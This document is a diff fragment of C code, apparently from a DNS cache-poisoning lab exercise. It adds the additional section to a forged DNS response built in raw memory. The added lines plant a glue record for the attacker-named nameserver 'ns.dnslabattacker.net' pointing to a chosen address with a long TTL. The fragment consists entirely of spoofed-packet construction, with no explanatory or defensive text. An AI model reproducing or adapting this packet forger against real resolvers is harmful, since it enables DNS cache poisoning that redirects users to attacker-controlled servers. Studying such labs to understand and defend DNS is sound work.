@@ -337,5 +337,23 @@ void responsePacket(char *dns_data, char *src_addr, char *dest_add){
     char *nsname = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength);
     strcpy(nsname, "\2ns\16dnslabattacker\3net");
     int nsnamelen = strlen(nsname) + 1;
+    
+    // Additional Section
+    char *ar = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen);
+    strcpy(ar, "\2ns\16dnslabattacker\3net");
+    int arlength = strlen(ar) + 1;
+    struct ansEnd *arend = (struct ansEnd *)(ar + arlength);
+    arend->type = htons(1);
+    arend->class = htons(1);
+    arend->ttl_l = htons(0x00);
+    arend->ttl_h = htons(0xD0);
+    arend->datalen = htons(4);
+    char *araddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen + arlength + sizeof(struct ansEnd));
+    strcpy(araddr, "\1\1\1\1");
+    int araddrlen = strlen(araddr);
+    
+    // End of DNS packet
+    
+    
 }
 ```
